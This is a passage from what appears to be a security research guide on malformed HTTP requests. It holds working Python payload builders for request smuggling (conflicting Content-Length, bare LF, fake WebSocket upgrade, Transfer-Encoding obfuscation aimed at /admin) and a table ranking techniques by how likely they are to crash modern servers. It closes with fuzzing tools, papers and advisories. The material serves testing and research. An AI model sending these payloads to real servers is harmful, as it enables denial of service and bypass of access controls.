    )
    sock.send(payload)
```

### Recipe 9: HTTP/0.9 Request (Missing Version)

```python
def send_http09(target):
    """HTTP/0.9 request -- no version, no headers"""
    payload = b"GET /\r\n"
    sock.send(payload)
```

### Recipe 10: Duplicate Conflicting Headers

```python
def send_duplicate_headers(target):
    """Multiple conflicting Content-Length values"""
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"Content-Length: 0\r\n"
        b"Content-Length: 50\r\n"
        b"\r\n"
        b"GET /admin HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"\r\n"
    )
    sock.send(payload)
```

### Recipe 11: Bare LF Line Terminators

```python
def send_bare_lf(target):
    """Bare LF instead of CRLF -- smuggling via CVE-2025-22871"""
    payload = (
        b"POST / HTTP/1.1\n"
        b"Host: " + target.encode() + b"\n"
        b"Transfer-Encoding: chunked\n"
        b"\n"
        b"5\n"
        b"hello\n"
        b"0\n"
        b"\n"
    )
    sock.send(payload)
```

### Recipe 12: WebSocket Upgrade Without Actual WebSocket

```python
def send_fake_upgrade(target):
    """Fake WebSocket upgrade to bypass proxy HTTP parsing"""
    payload = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: upgrade\r\n"
        b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        b"Sec-WebSocket-Version: 13\r\n"
        b"\r\n"
        b"GET /admin HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"\r\n"
    )
    sock.send(payload)
```

### Recipe 13: Transfer-Encoding Obfuscation Battery

```python
def send_te_obfuscation_battery(target):
    """Try multiple TE obfuscation variants"""
    variants = [
        b"Transfer-Encoding: xchunked",
        b"Transfer-Encoding : chunked",
        b"Transfer-Encoding:\tchunked",
        b"Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        b"Transfer-encoding: chunked",
        b"TRANSFER-ENCODING: chunked",
        b"Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
        b"Transfer-Encoding:\x0bchunked",  # vertical tab
        b"Transfer-Encoding: chunked\x00",  # null terminator
    ]
    for te in variants:
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + target.encode() + b"\r\n"
            b"Content-Length: 6\r\n"
            + te + b"\r\n"
            b"\r\n"
            b"0\r\n\r\nX"
        )
        sock.send(payload)
```

---

## 9. Priority Ranking

Techniques ranked by likelihood of actually crashing/disrupting a **default-config modern server** (not just historical CVEs):

### Tier 1: High Probability of Disruption

| # | Technique | Why |
|---|-----------|-----|
| 1 | **HTTP/2 CONTINUATION flood** | Affects nearly all HTTP/2 implementations. Single connection crash. Most impactful CVE cluster of 2024. |
| 2 | **HTTP/2 Rapid Reset** | Universal HTTP/2 vulnerability. Even with mitigations, variants like MadeYouReset bypass them. |
| 3 | **Slowloris / slow body** | Works against any thread-per-connection server (Apache, many application servers). No special parsing needed. |
| 4 | **CL.TE / TE.CL smuggling** | Not a crash per se, but achieves request poisoning on virtually any proxy+origin pair with parsing differences. |
| 5 | **Null bytes in headers** | C-based parsers (nginx modules, custom servers) frequently mishandle. Can cause truncation, crash, or undefined behavior. |

### Tier 2: Moderate Probability

| # | Technique | Why |
|---|-----------|-----|
| 6 | **Chunked encoding edge cases** | Large chunk sizes, mismatched lengths, extensions. Parsers vary widely. |
| 7 | **Duplicate/conflicting Content-Length** | Many servers still don't reject properly per RFC. Creates smuggling. |
| 8 | **Gzip/XML/JSON bombs** | Effective when server decompresses request bodies. Many APIs accept gzipped input. |
| 9 | **Malformed multipart** | Empty field names, missing boundaries, oversized preambles. Framework-specific crashes. |
| 10 | **Bare LF line terminators** | Go, Node.js, and others have accepted bare LF. Creates smuggling when behind strict proxies. |

### Tier 3: Targeted / Version-Specific

| # | Technique | Why |
|---|-----------|-----|
| 11 | **HTTP/2 pseudo-header injection** | Only works when HTTP/2 is downgraded to HTTP/1.1. Requires specific proxy behavior. |
| 12 | **Obs-fold header injection** | Most modern servers reject obs-fold. But older versions of Akamai, Netty were vulnerable. |
| 13 | **Negative Content-Length** | Modern servers reject this, but legacy or custom servers may not. |
| 14 | **Range header abuse** | Apache-specific (patched long ago), but custom servers may still be vulnerable. |
| 15 | **HTTP/0.9 requests** | Most modern servers handle gracefully, but edge cases exist. |
| 16 | **WebSocket upgrade smuggling** | Requires specific proxy configuration. h2c smuggling variant is more reliable. |
| 17 | **Pipelining abuse** | Most servers handle gracefully. OpenBSD httpd crash was version-specific. |
| 18 | **TE obfuscation variants** | Effectiveness depends on specific proxy/server pair. ~20% WAF bypass rate. |

---

## 10. Research Tools & References

### Differential Fuzzing Tools

- **HTTP Garden** (github.com/narfindustries/http-garden): Differential testing framework for HTTP/1.1 implementations. Discovered 100+ bugs. Supports stream-level, byte-level, and grammar-based mutations.
- **T-Reqs** (github.com/bahruzjabiyev/t-reqs): Grammar-based HTTP/1 fuzzer focused on request smuggling. Discovered novel payloads beyond CL/TE manipulation.
- **AFL/AFLNet**: Coverage-guided fuzzer with network protocol support. StateAFL adds protocol state tracking.

### Smuggling Detection

- **PortSwigger HTTP Request Smuggler**: Burp Suite extension for automated smuggling detection. Supports CL.TE, TE.CL, H2.CL, H2.TE, CL.0, and pause-based desync.
- **smuggler.py**: Standalone Python tool for testing TE.CL, CL.TE, and TE.TE variants.

### HTTP Evasion Research

- **noxxi.de/research/http-evader**: Comprehensive HTTP evasion testing against WAFs and firewalls. Documents chunked encoding bypass rates (~15-40% of WAFs).
- **PortSwigger Research**: James Kettle's work on HTTP desync attacks, browser-powered desync, and "HTTP/1.1 must die" research.

### Key Papers

- "The HTTP Garden: Discovering Parsing Vulnerabilities in HTTP/1.1 Implementations by Differential Fuzzing of Request Streams" (2024, arxiv.org/abs/2405.17737)
- "T-Reqs: HTTP Request Smuggling with Differential Fuzzing" (ACM CCS 2021)
- "HTTP Request Synchronization Defeats Discrepancy Attacks" (2025, arxiv.org/html/2510.09952v1)
- "PRETT2: Discovering HTTP/2 DoS Vulnerabilities via Protocol Reverse Engineering" (ESORICS 2024)

### Key Advisories

- CERT/CC VU#421644: HTTP/2 CONTINUATION Flood
- CERT/CC VU#767506: HTTP/2 MadeYouReset
- Cloudflare: HTTP/2 Rapid Reset technical breakdown
- Akamai CVE-2025-54142: OPTIONS + body smuggling
- Akamai CVE-2025-32094: OPTIONS + Expect + obs-fold smuggling

---

*This document catalogs techniques for testing purposes only. All techniques should be used only against systems you own or have explicit authorization to test.*
